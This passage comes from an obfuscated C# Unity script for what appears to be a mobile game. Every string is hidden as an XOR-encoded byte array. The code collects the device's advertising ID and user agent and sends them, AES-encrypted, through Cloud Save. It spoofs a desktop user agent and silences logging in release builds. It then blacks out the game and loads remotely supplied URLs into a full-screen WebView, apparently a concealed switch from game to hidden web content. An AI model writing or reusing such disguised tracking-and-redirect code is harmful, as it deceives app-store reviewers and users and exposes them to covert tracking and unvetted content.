                WLog(_0x6bb1939a._0x92fa81ce(new byte[26] { 72, 99, 121, 100, 102, 110, 71, 98, 96, 110, 43, 100, 123, 110, 101, 43, 110, 115, 127, 110, 121, 101, 106, 103, 49, 43 }, 11) + _0xc2fe0bba);
                _0x1a54f09a.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[11] { 254, 251, 251, 220, 254, 235, 250, 248, 240, 237, 230 }, 159), _0x6bb1939a._0x92fa81ce(new byte[33] { 45, 34, 40, 62, 35, 37, 40, 98, 37, 34, 56, 41, 34, 56, 98, 47, 45, 56, 41, 43, 35, 62, 53, 98, 14, 30, 3, 27, 31, 13, 14, 0, 9 }, 76));
                _0x1a54f09a.Call<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[8] { 86, 83, 83, 113, 91, 86, 80, 68 }, 55), 0x10000000);
                _0x91e6a62c.Call(_0x6bb1939a._0x92fa81ce(new byte[13] { 80, 87, 66, 81, 87, 98, 64, 87, 74, 85, 74, 87, 90 }, 35), _0x1a54f09a);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x6bb1939a._0x92fa81ce(new byte[28] { 151, 188, 166, 187, 185, 177, 152, 189, 191, 177, 244, 177, 172, 160, 177, 166, 186, 181, 184, 244, 178, 181, 189, 184, 177, 176, 238, 244 }, 212) + e.Message);
            Application.OpenURL(_0xc2fe0bba);
            return true;
        }
    }

    private Text _0x5e88e5d6;
    private void _0x07866a0f(string _0x9c89f451)
    {
        _0xced42c31();
        StartCoroutine(_0x279bea12(_0x9c89f451));
    }

    private bool _0x33a49c0c = false;
    private void _0x8a3a47a4()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private string _0x32227e8a()
    {
        if (string.IsNullOrEmpty(_0x0b59b7b6) && _0x5ddc0b99 != null)
            _0x0b59b7b6 = _0x5ddc0b99.GetUserAgent();
        if (string.IsNullOrEmpty(_0x0b59b7b6))
            return string.Empty;
        string _0xf07c8e1d = Regex.Replace(_0x0b59b7b6, _0x6bb1939a._0x92fa81ce(new byte[11] { 121, 86, 15, 30, 121, 86, 15, 82, 83, 121, 71 }, 37), string.Empty);
        _0xf07c8e1d = Regex.Replace(_0xf07c8e1d, _0x6bb1939a._0x92fa81ce(new byte[15] { 178, 157, 197, 172, 155, 135, 130, 138, 193, 181, 176, 213, 199, 179, 197 }, 238), string.Empty);
        _0xf07c8e1d = Regex.Replace(_0xf07c8e1d, _0x6bb1939a._0x92fa81ce(new byte[15] { 14, 61, 42, 43, 49, 55, 54, 119, 108, 4, 118, 104, 4, 43, 114 }, 88), string.Empty);
        return Regex.Replace(_0xf07c8e1d, _0x6bb1939a._0x92fa81ce(new byte[6] { 115, 92, 84, 29, 3, 82 }, 47), _0x6bb1939a._0x92fa81ce(new byte[1] { 152 }, 184)).Trim();
    }

    private bool _0x6724a1dc = false;
    // NATIVE WEB VIEW METHODS
    private UniWebView _0x5ddc0b99 = null;
    private string _0xe2469192 = "";
    private string _0x15a89d2d = "";
    private static readonly string WindowsDesktopUserAgent = _0x6bb1939a._0x92fa81ce(new byte[111] { 101, 71, 82, 65, 68, 68, 73, 7, 29, 6, 24, 8, 0, 127, 65, 70, 76, 71, 95, 91, 8, 102, 124, 8, 25, 24, 6, 24, 19, 8, 127, 65, 70, 30, 28, 19, 8, 80, 30, 28, 1, 8, 105, 88, 88, 68, 77, 127, 77, 74, 99, 65, 92, 7, 29, 27, 31, 6, 27, 30, 8, 0, 99, 96, 124, 101, 100, 4, 8, 68, 65, 67, 77, 8, 111, 77, 75, 67, 71, 1, 8, 107, 64, 90, 71, 69, 77, 7, 25, 26, 24, 6, 24, 6, 24, 6, 24, 8, 123, 73, 78, 73, 90, 65, 7, 29, 27, 31, 6, 27, 30 }, 40);
    private Canvas _0xee768ccc()
    {
        if (_0x4f715822 != null)
            return _0x4f715822;
        var _0x3e22505a = gameObject.GetComponentInChildren<Canvas>();
        if (_0x3e22505a == null)
        {
            var _0x7bdd09a5 = new GameObject(_0x6bb1939a._0x92fa81ce(new byte[6] { 91, 121, 118, 110, 121, 107 }, 24), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x3e22505a = _0x7bdd09a5.GetComponent<Canvas>();
            _0x3e22505a.transform.SetParent(transform, false);
            _0x3e22505a.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x4f715822 = _0x3e22505a;
        return _0x4f715822;
    }

    private string _0x37076cd9 = "";
    internal void _0xcea5638c()
    {
        Rect _0x7d40bab6 = Screen.safeArea;
        Vector2 _0xbb2cba47 = new Vector2(Screen.width, Screen.height);
        if (_0x7d40bab6 == lastSafe && _0xbb2cba47 == lastSize)
            return;
        // Apply manual padding
        _0x7d40bab6.xMin += _0xbb651133;
        _0x7d40bab6.xMax -= _0xb2b5c6cb;
        _0x7d40bab6.yMin += _0x8a414432;
        _0x7d40bab6.yMax -= _0x9beb399f;
        // Convert Unity safe area -> native WebView frame
        Rect _0xee820603 = new Rect(_0x7d40bab6.x, _0xbb2cba47.y - _0x7d40bab6.y - _0x7d40bab6.height, // Y flip for native coordinate system
 _0x7d40bab6.width, _0x7d40bab6.height);
        _0x5ddc0b99.Frame = _0xee820603;
        lastSafe = Screen.safeArea;
        lastSize = _0xbb2cba47;
    }

    public void _0xd396cda6()
    {
        if (_0xa32ed23d)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[33] { 69, 74, 123, 109, 106, 67, 62, 74, 119, 115, 123, 108, 62, 113, 107, 106, 62, 51, 32, 62, 115, 113, 104, 123, 62, 106, 113, 62, 109, 125, 123, 112, 123 }, 30));
            }
#endif
        }

        _0xf2040507();
    }

    private string _0x0e5e18b6 = "";
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x02d290b9(string _0x43f23710, string _0xe200fab2)
    {
        try
        {
            using var _0xea413977 = Aes.Create();
            _0xea413977.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xe200fab2));
            _0xea413977.GenerateIV();
            using var _0x71f2ccea = new MemoryStream();
            _0x71f2ccea.Write(_0xea413977.IV, 0, _0xea413977.IV.Length);
            using (var _0x78b4ab79 = new CryptoStream(_0x71f2ccea, _0xea413977.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x6dcb255f = Encoding.UTF8.GetBytes(_0x43f23710);
                _0x78b4ab79.Write(_0x6dcb255f, 0, _0x6dcb255f.Length);
                _0x78b4ab79.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x71f2ccea.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0xd3338b8b;
    private bool _0x0e58127c()
    {
        var _0x954cc0c1 = Keyboard.current;
        return _0x954cc0c1 != null && _0x954cc0c1.escapeKey.wasPressedThisFrame;
    }

    private bool _0xfba3e12a = false;
    private void WLog(string _0x1b14ec27)
    {
#if B_LOGS
        {
            Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[7] { 168, 167, 150, 128, 135, 174, 211 }, 243) + _0x1b14ec27);
        }
#endif
    }

    private void _0x951460d9(string _0x304b5643)
    {
        Dictionary<string, object> _0x1305e6db;
        try
        {
            _0x1305e6db = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x304b5643);
        }
        catch
        {
            return;
        }

        var _0x5feeb8bb = ReadPushField(_0x1305e6db, _0x6bb1939a._0x92fa81ce(new byte[3] { 122, 125, 99 }, 15));
        if (string.IsNullOrWhiteSpace(_0x5feeb8bb))
            return;
        _0x5feeb8bb = _0x5feeb8bb.Trim();
        if (!IsHttpUrl(_0x5feeb8bb))
            return;
        if (string.Equals(_0x5feeb8bb, _0x2d48df0b, StringComparison.Ordinal))
            return;
        _0x2d48df0b = _0x5feeb8bb;
        OpenUrlExternally(_0x5feeb8bb);
    }

    // MAIN FLOW
    private bool _0x2fa07cd8 { get; set; }

    internal string _0xae8bfd91(string _0x48697c30)
    {
        int _0x1db47dd5 = _0x48697c30.IndexOf(_0x6bb1939a._0x92fa81ce(new byte[3] { 78, 67, 26 }, 39), StringComparison.OrdinalIgnoreCase);
        if (_0x1db47dd5 < 0)
            return null;
        string _0x2c290d43 = _0x48697c30.Substring(_0x1db47dd5 + 3);
        int _0x83a70dc3 = _0x2c290d43.IndexOf('&');
        return _0x83a70dc3 >= 0 ? _0x2c290d43.Substring(0, _0x83a70dc3) : _0x2c290d43;
    }

    private string _0x5341944e = "";
    internal bool isApplicationPause = false;
    private string _0x27213d69 = "";
    private bool OpenUrlExternally(string _0x4a3afb0a)
    {
        return _0x67a8d970(_0x4a3afb0a);
    }

    private async Task _0x439fbcf0()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x15a89d2d = _0x6bb1939a._0x92fa81ce(new byte[5] { 60, 59, 54, 41, 63 }, 90);
        _0xb4c3b0f4 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x5341944e = DateTime.UtcNow.Ticks.ToString();
        _0x37770fa6 = "";
        JObject _0x618b7293 = BuildRandomPayload(_0xce136746, _0xc8563b2e, _0x37076cd9, _0xd2370ed3, _0x6432cf65, _0xc289dcbd, _0x34812c0c, _0x0b59b7b6, _0x0e5e18b6, _0xcfc4feaf, _0x15a89d2d, _0x37770fa6, _0x700d5500, _0x27213d69, _0x6836455b.ToString(), _0xa3df0380, _0x5341944e, _0xb4c3b0f4, _0xe2469192, _0xbf0d9e0b, _0xc9658e78, _0xccab212e, _0x64e8d81b());
        var _0x81077a5b = _0x02d290b9(_0x618b7293.ToString(), _0xe2469192);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0x618b7293}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x6bb1939a._0x92fa81ce(new byte[7] { 45, 60, 36, 49, 50, 60, 57 }, 93) + _0xe2469192, _0x81077a5b } });
            await Task.Delay(500);
            string _0x3d6b502b = "";
            for (int _0x3074d051 = 0; _0x3074d051 < 20; _0x3074d051++)
            {
                if (await _0xff0f4872(1, 1))
                {
                    await _0xdb8e0176(_0x6bb1939a._0x92fa81ce(new byte[7] { 86, 88, 91, 87, 95, 81, 80 }, 52));
                    _0xf2040507();
                    return;
                }

                _0x3d6b502b = await _0x907c9f11(1, 500);
                if (!string.IsNullOrEmpty(_0x3d6b502b))
                    break;
            }

            _0x5825b14c(_0x3d6b502b);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[22] { 118, 121, 104, 126, 121, 112, 13, 106, 72, 67, 72, 95, 76, 65, 13, 72, 95, 95, 66, 95, 23, 13 }, 45) + e.Message);
#endif
            }

            _0xf2040507();
        }
    }

    private void _0xd3cd2c28(string _0x45bdbb5d)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[34] { 18, 29, 44, 58, 61, 20, 105, 15, 44, 61, 42, 33, 105, 12, 49, 61, 59, 40, 105, 25, 60, 58, 33, 105, 13, 40, 61, 40, 105, 27, 40, 62, 115, 105 }, 73) + _0x45bdbb5d);
#endif
            }
        }

        var _0xd50ca7fd = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x45bdbb5d);
        StartCoroutine(_0x4ac43223(_0xd50ca7fd));
    }

    private Canvas _0x4f715822;
    // PART 3
    private string _0xd12fd142()
    {
        try
        {
            var _0x627cdac5 = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[30] { 178, 190, 188, 255, 164, 191, 184, 165, 168, 226, 181, 255, 161, 189, 176, 168, 180, 163, 255, 132, 191, 184, 165, 168, 129, 189, 176, 168, 180, 163 }, 209));
            var _0x356895d8 = _0x627cdac5.GetStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[15] { 206, 216, 223, 223, 200, 195, 217, 236, 206, 217, 196, 219, 196, 217, 212 }, 173));
            var _0xe02e9d5b = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[57] { 135, 139, 137, 202, 131, 139, 139, 131, 136, 129, 202, 133, 138, 128, 150, 139, 141, 128, 202, 131, 137, 151, 202, 133, 128, 151, 202, 141, 128, 129, 138, 144, 141, 130, 141, 129, 150, 202, 165, 128, 146, 129, 150, 144, 141, 151, 141, 138, 131, 173, 128, 167, 136, 141, 129, 138, 144 }, 228));
            var _0x176515cd = _0xe02e9d5b.CallStatic<AndroidJavaObject>(_0x6bb1939a._0x92fa81ce(new byte[20] { 140, 142, 159, 170, 143, 157, 142, 153, 159, 130, 152, 130, 133, 140, 162, 143, 162, 133, 141, 132 }, 235), _0x356895d8);
            var _0xbde41179 = _0x176515cd.Call<string>(_0x6bb1939a._0x92fa81ce(new byte[5] { 233, 235, 250, 199, 234 }, 142));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0xbde41179}");
#endif
            }

            return string.IsNullOrEmpty(_0xbde41179) ? "" : _0xbde41179;
        }
        catch
        {
            return "";
        }
    }

    private string _0xc289dcbd { get; set; }

    private bool _0xdea5211c()
    {
        _0x8651a4d4.RemoveAll(_0xf0ec1f95 => _0xf0ec1f95 == null || !_0xf0ec1f95.IsAlive);
        return _0x8651a4d4.Count > 0;
    }

    // WS_SOURCE MONO
    public static _0x38c9f1f2 _0x38a77c79 { get; private set; }

    private bool _0x05e5bc35(string _0xd8105046, string _0xc987cb02)
    {
        string _0x96710488 = _0xae8bfd91(_0xd8105046);
        if (string.IsNullOrEmpty(_0x96710488))
            _0x96710488 = _0xc987cb02;
        if (_0x21cf754d(_0x96710488))
            return true;
        string _0xbeef3afc = string.IsNullOrEmpty(_0x96710488) ? _0x6bb1939a._0x92fa81ce(new byte[29] { 64, 92, 92, 88, 91, 18, 7, 7, 88, 68, 73, 81, 6, 79, 71, 71, 79, 68, 77, 6, 75, 71, 69, 7, 91, 92, 71, 90, 77 }, 40) : _0x6bb1939a._0x92fa81ce(new byte[46] { 85, 73, 73, 77, 78, 7, 18, 18, 77, 81, 92, 68, 19, 90, 82, 82, 90, 81, 88, 19, 94, 82, 80, 18, 78, 73, 82, 79, 88, 18, 92, 77, 77, 78, 18, 89, 88, 73, 92, 84, 81, 78, 2, 84, 89, 0 }, 61) + _0x96710488;
        WLog(_0x6bb1939a._0x92fa81ce(new byte[35] { 46, 5, 31, 2, 0, 8, 33, 4, 6, 8, 77, 0, 12, 31, 6, 8, 25, 77, 11, 12, 1, 1, 15, 12, 14, 6, 77, 12, 30, 77, 26, 8, 15, 87, 77 }, 109) + _0xbeef3afc);
        return _0x67a8d970(_0xbeef3afc);
    }

    internal bool isDestroyedForce = false;
    private void Awake()
    {
        if (_0x38a77c79 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x38a77c79 = gameObject.GetComponent<_0x38c9f1f2>();
        DontDestroyOnLoad(gameObject);
        _0xd2370ed3 = _0xc289dcbd = _0x34812c0c = "";
        _0x1aadce68 = "";
        _0xa32ed23d = false;
    }

    private string _0x34812c0c { get; set; }

    private bool _0x25c0631c = false;
    private string _0x0d753826()
    {
        string _0x1d9b88b6 = _0x32227e8a();
        if (string.IsNullOrEmpty(_0x1d9b88b6))
            return _0x6bb1939a._0x92fa81ce(new byte[7] { 44, 53, 51, 62, 122, 106, 97 }, 90);
        string _0xf1c8f76e = _0x1d9b88b6.Replace(_0x6bb1939a._0x92fa81ce(new byte[1] { 160 }, 252), _0x6bb1939a._0x92fa81ce(new byte[2] { 229, 229 }, 185)).Replace(_0x6bb1939a._0x92fa81ce(new byte[1] { 223 }, 248), _0x6bb1939a._0x92fa81ce(new byte[2] { 251, 128 }, 167));
        var _0x189323e9 = Regex.Match(_0x1d9b88b6, _0x6bb1939a._0x92fa81ce(new byte[12] { 65, 106, 112, 109, 111, 103, 45, 42, 94, 102, 41, 43 }, 2));
        string _0x034fbc71 = _0x189323e9.Success ? _0x189323e9.Groups[1].Value : _0x6bb1939a._0x92fa81ce(new byte[3] { 237, 238, 236 }, 220);
        return _0x6bb1939a._0x92fa81ce(new byte[12] { 61, 115, 96, 123, 118, 97, 124, 122, 123, 61, 60, 110 }, 21) + _0x6bb1939a._0x92fa81ce(new byte[8] { 174, 185, 170, 248, 173, 185, 229, 255 }, 216) + _0xf1c8f76e + _0x6bb1939a._0x92fa81ce(new byte[2] { 246, 234 }, 209) + _0x6bb1939a._0x92fa81ce(new byte[30] { 103, 112, 99, 49, 97, 99, 126, 101, 126, 44, 95, 112, 103, 120, 118, 112, 101, 126, 99, 63, 97, 99, 126, 101, 126, 101, 104, 97, 116, 42 }, 17) + _0x6bb1939a._0x92fa81ce(new byte[121] { 68, 87, 76, 65, 86, 75, 77, 76, 2, 70, 71, 68, 10, 77, 64, 72, 14, 73, 71, 91, 14, 84, 67, 78, 11, 89, 86, 80, 91, 89, 109, 64, 72, 71, 65, 86, 12, 70, 71, 68, 75, 76, 71, 114, 80, 77, 82, 71, 80, 86, 91, 10, 77, 64, 72, 14, 73, 71, 91, 14, 89, 69, 71, 86, 24, 68, 87, 76, 65, 86, 75, 77, 76, 10, 11, 89, 80, 71, 86, 87, 80, 76, 2, 84, 67, 78, 25, 95, 14, 65, 77, 76, 68, 75, 69, 87, 80, 67, 64, 78, 71, 24, 86, 80, 87, 71, 95, 11, 25, 95, 65, 67, 86, 65, 74, 10, 71, 11, 89, 95, 95 }, 34) + _0x6bb1939a._0x92fa81ce(new byte[26] { 70, 71, 68, 10, 82, 80, 77, 86, 77, 14, 5, 87, 81, 71, 80, 99, 69, 71, 76, 86, 5, 14, 87, 67, 11, 25 }, 34) + _0x6bb1939a._0x92fa81ce(new byte[52] { 127, 126, 125, 51, 107, 105, 116, 111, 116, 55, 60, 122, 107, 107, 77, 126, 105, 104, 114, 116, 117, 60, 55, 110, 122, 53, 105, 126, 107, 119, 122, 120, 126, 51, 52, 69, 86, 116, 97, 114, 119, 119, 122, 71, 52, 52, 55, 60, 60, 50, 50, 32 }, 27) + _0x6bb1939a._0x92fa81ce(new byte[37] { 18, 19, 16, 94, 6, 4, 25, 2, 25, 90, 81, 6, 26, 23, 2, 16, 25, 4, 27, 81, 90, 81, 58, 31, 24, 3, 14, 86, 23, 4, 27, 0, 78, 26, 81, 95, 77 }, 118) + _0x6bb1939a._0x92fa81ce(new byte[34] { 44, 45, 46, 96, 56, 58, 39, 60, 39, 100, 111, 62, 45, 38, 44, 39, 58, 111, 100, 111, 15, 39, 39, 47, 36, 45, 104, 1, 38, 43, 102, 111, 97, 115 }, 72) + _0x6bb1939a._0x92fa81ce(new byte[30] { 113, 112, 115, 61, 101, 103, 122, 97, 122, 57, 50, 120, 116, 109, 65, 122, 96, 118, 125, 69, 122, 124, 123, 97, 102, 50, 57, 32, 60, 46 }, 21) + _0x6bb1939a._0x92fa81ce(new byte[48] { 146, 148, 159, 157, 144, 135, 148, 198, 147, 135, 130, 219, 157, 132, 148, 135, 136, 130, 149, 220, 189, 157, 132, 148, 135, 136, 130, 220, 193, 165, 142, 148, 137, 139, 143, 147, 139, 193, 202, 144, 131, 148, 149, 143, 137, 136, 220, 193 }, 230) + _0x034fbc71 + _0x6bb1939a._0x92fa81ce(new byte[35] { 252, 166, 247, 160, 185, 169, 186, 181, 191, 225, 252, 156, 180, 180, 188, 183, 190, 251, 152, 179, 169, 180, 182, 190, 252, 247, 173, 190, 169, 168, 178, 180, 181, 225, 252 }, 219) + _0x034fbc71 + _0x6bb1939a._0x92fa81ce(new byte[238] { 154, 192, 145, 198, 223, 207, 220, 211, 217, 135, 154, 243, 210, 201, 128, 252, 130, 255, 207, 220, 211, 217, 154, 145, 203, 216, 207, 206, 212, 210, 211, 135, 154, 143, 137, 154, 192, 224, 145, 208, 210, 223, 212, 209, 216, 135, 201, 207, 200, 216, 145, 205, 209, 220, 201, 219, 210, 207, 208, 135, 154, 252, 211, 217, 207, 210, 212, 217, 154, 145, 218, 216, 201, 245, 212, 218, 213, 248, 211, 201, 207, 210, 205, 196, 235, 220, 209, 200, 216, 206, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 207, 216, 201, 200, 207, 211, 157, 237, 207, 210, 208, 212, 206, 216, 147, 207, 216, 206, 210, 209, 203, 216, 149, 198, 220, 207, 222, 213, 212, 201, 216, 222, 201, 200, 207, 216, 135, 154, 220, 207, 208, 154, 145, 223, 212, 201, 211, 216, 206, 206, 135, 154, 139, 137, 154, 145, 208, 210, 223, 212, 209, 216, 135, 201, 207, 200, 216, 145, 208, 210, 217, 216, 209, 135, 154, 154, 145, 205, 209, 220, 201, 219, 210, 207, 208, 135, 154, 252, 211, 217, 207, 210, 212, 217, 154, 145, 205, 209, 220, 201, 219, 210, 207, 208, 235, 216, 207, 206, 212, 210, 211, 135, 154, 140, 137, 147, 141, 147, 141, 154, 145, 200, 220, 251, 200, 209, 209, 235, 216, 207, 206, 212, 210, 211, 135, 154 }, 189) + _0x034fbc71 + _0x6bb1939a._0x92fa81ce(new byte[117] { 131, 157, 131, 157, 131, 157, 138, 208, 132, 150, 208, 208, 150, 226, 207, 199, 200, 206, 217, 131, 201, 200, 203, 196, 195, 200, 253, 223, 194, 221, 200, 223, 217, 212, 133, 221, 223, 194, 217, 194, 129, 138, 216, 222, 200, 223, 236, 202, 200, 195, 217, 233, 204, 217, 204, 138, 129, 214, 202, 200, 217, 151, 203, 216, 195, 206, 217, 196, 194, 195, 133, 132, 214, 223, 200, 217, 216, 223, 195, 141, 216, 204, 201, 150, 208, 129, 206, 194, 195, 203, 196, 202, 216, 223, 204, 207, 193, 200, 151, 217, 223, 216, 200, 208, 132, 150, 208, 206, 204, 217, 206, 197, 133, 200, 132, 214, 208 }, 173) + _0x6bb1939a._0x92fa81ce(new byte[5] { 220, 136, 137, 136, 154 }, 161);
    }

    private GameObject _0x009ae614;
    private string _0xd2370ed3 = "";
    private void _0x3175c2ce()
    {
        if (_0x5ddc0b99 == null)
            return;
        if (_0x82d22cf4)
            _0x5ddc0b99.SetUserAgent(_0x32227e8a());
        else
            _0x5ddc0b99.SetUserAgent("");
    }

    private async void Start()
    {
        await _0xe560f9bb();
    }

    private UniWebViewPopup _0x2aa6d430()
    {
        for (int _0x8880fe77 = _0x8651a4d4.Count - 1; _0x8880fe77 >= 0; _0x8880fe77--)
        {
            var _0xd3642363 = _0x8651a4d4[_0x8880fe77];
            if (_0xd3642363 != null && _0xd3642363.IsAlive)
                return _0xd3642363;
            _0x8651a4d4.RemoveAt(_0x8880fe77);
        }

        return null;
    }

    private IEnumerator _0x4ac43223(Dictionary<string, object> _0xb986e794)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[30] { 46, 33, 16, 6, 1, 40, 85, 51, 16, 1, 22, 29, 85, 48, 13, 1, 7, 20, 85, 37, 0, 6, 29, 85, 49, 20, 1, 20, 79, 85 }, 117) + string.Join(_0x6bb1939a._0x92fa81ce(new byte[1] { 100 }, 109), _0xb986e794));
#endif
            }
        }

        string _0x0a4a42bd = "";
        // Primary source: nested JSON under "notificationData"
        if (_0xb986e794 != null && _0xb986e794.TryGetValue(_0x6bb1939a._0x92fa81ce(new byte[16] { 17, 16, 11, 22, 25, 22, 28, 30, 11, 22, 16, 17, 59, 30, 11, 30 }, 127), out var raw))
        {
            try
            {
                var _0x44c13551 = raw?.ToString();
                var _0xe832a8db = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x44c13551);
                if (_0xe832a8db != null && _0xe832a8db.TryGetValue(_0x6bb1939a._0x92fa81ce(new byte[6] { 178, 164, 175, 165, 168, 165 }, 193), out var val))
                {
                    _0x0a4a42bd = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x6bb1939a._0x92fa81ce(new byte[30] { 150, 153, 168, 190, 185, 237, 157, 184, 190, 165, 144, 237, 135, 158, 130, 131, 237, 189, 172, 191, 190, 168, 237, 168, 191, 191, 162, 191, 247, 237 }, 205) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x0a4a42bd) && _0xb986e794 != null && _0xb986e794.TryGetValue(_0x6bb1939a._0x92fa81ce(new byte[6] { 237, 251, 240, 250, 247, 250 }, 158), out var lab))
        {
            _0x0a4a42bd = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[38] { 10, 5, 52, 34, 37, 113, 1, 36, 34, 57, 12, 113, 23, 52, 37, 50, 57, 52, 53, 113, 34, 52, 63, 53, 56, 53, 113, 55, 35, 62, 60, 113, 59, 34, 62, 63, 107, 113 }, 81) + _0x0a4a42bd);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x0a4a42bd))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[38] { 109, 98, 83, 69, 66, 22, 102, 67, 69, 94, 107, 22, 97, 87, 95, 66, 22, 66, 89, 22, 89, 70, 83, 88, 22, 65, 95, 66, 94, 22, 69, 83, 88, 82, 95, 82, 12, 22 }, 54) + _0x0a4a42bd);
            }
#endif
        }

        _0xd3338b8b = _0x0a4a42bd;
        yield return new WaitUntil(() => _0xa32ed23d);
        var _0xc1ebc9b0 = _0x907c9f11(2, 100);
        yield return new WaitUntil(() => _0xc1ebc9b0.IsCompleted);
        string _0x5569cf4c = _0xc1ebc9b0.Result;
        if (!string.IsNullOrEmpty(_0x5569cf4c))
        {
            string _0x9799fa9f = _0xbf05bd49(_0x5569cf4c, _0x0a4a42bd);
            {
#if B_LOGS
                Debug.Log(_0x6bb1939a._0x92fa81ce(new byte[33] { 28, 19, 34, 52, 51, 103, 23, 50, 52, 47, 26, 103, 21, 34, 43, 40, 38, 35, 103, 16, 34, 37, 17, 46, 34, 48, 103, 48, 46, 51, 47, 125, 103 }, 71) + _0x9799fa9f);
#endif
            }

            _0x5ddc0b99.Load(_0x9799fa9f);
        }
    }

    private ApplicationInstallMode _0x6836455b = ApplicationInstallMode.Unknown;
    private bool _0xebb0e042 = false;
    private string Decrypt(string _0x15d95405, string _0x524c28db)
    {
        try
        {
            var _0xff21812c = Convert.FromBase64String(_0x15d95405);
            using var _0xc54d65fc = Aes.Create();
            _0xc54d65fc.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x524c28db));
            var _0x59b17dfe = new byte[16];
            Buffer.BlockCopy(_0xff21812c, 0, _0x59b17dfe, 0, 16);
            _0xc54d65fc.IV = _0x59b17dfe;
            using var _0x20810507 = new MemoryStream(_0xff21812c, 16, _0xff21812c.Length - 16);
            using var _0xab5ced1a = new CryptoStream(_0x20810507, _0xc54d65fc.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xcc69ab8a = new StreamReader(_0xab5ced1a, Encoding.UTF8);
            return _0xcc69ab8a.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private void _0x48f4a47c(string _0xb8cb4e0a)
    {
        if (string.IsNullOrEmpty(_0xb8cb4e0a))
            return;
        if (TryOpenExternalLikeChrome(_0xb8cb4e0a))
            return;
        OpenUrlExternally(_0xb8cb4e0a);
    }

    private IEnumerator _0xdd937726(float _0x0de236c7)
    {
        yield return new WaitForSeconds(_0x0de236c7);
        if (!_0x2fa07cd8)
        {
            _0x2fa07cd8 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x6432cf65}");
                }
#endif
            }
        }
    }

    private JObject BuildRandomPayload(params string[] _0x8edd7d5e)
    {
        JObject _0xa36578f2 = new JObject();
        foreach (var _0xedf7d4c2 in _0x8edd7d5e)
        {
            string _0x8fc0028b = _0xe20276db();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x8fc0028b} val={_0xedf7d4c2}");
#endif
            }

            _0xa36578f2.Add(_0x8fc0028b, _0xedf7d4c2 == null ? "" : _0xedf7d4c2);
        }

        return _0xa36578f2;
    }

    private void _0x32477d12(bool _0x75ba6fcb)
    {
        _0xffd250db();
        _0x009ae614.SetActive(_0x75ba6fcb);
        _0x33a49c0c = _0x75ba6fcb;
        if (_0x75ba6fcb)
        {
            _0x009ae614.transform.SetAsLastSibling();
            if (_0x9997d60b != null)
                _0x9997d60b.localRotation = Quaternion.identity;
        }
    }

    private void _0x3b9d4e97()
    {
        WLog(_0x6bb1939a._0x92fa81ce(new byte[21] { 180, 157, 142, 152, 139, 157, 142, 153, 220, 158, 157, 159, 151, 220, 140, 142, 153, 143, 143, 153, 152 }, 252));
        if (Time.frameCount == _0x0da4a74b)
            return;
        _0x0da4a74b = Time.frameCount;
        if (_0xe01a4881())
            return;
        _0x05b994f8();
    }

    private bool _0x21cf754d(string _0xf83b4e0f)
    {
        if (string.IsNullOrEmpty(_0xf83b4e0f))
            return false;
        try
        {
            using (var _0xd55ffcd4 = new AndroidJavaClass(_0x6bb1939a._0x92fa81ce(new byte[30] { 209, 221, 223, 156, 199, 220, 219, 198, 203, 129, 214, 156, 194, 222, 211, 203, 215, 192, 156, 231, 220, 219, 198, 203, 226, 222, 211, 203, 215, 192 }, 178)))
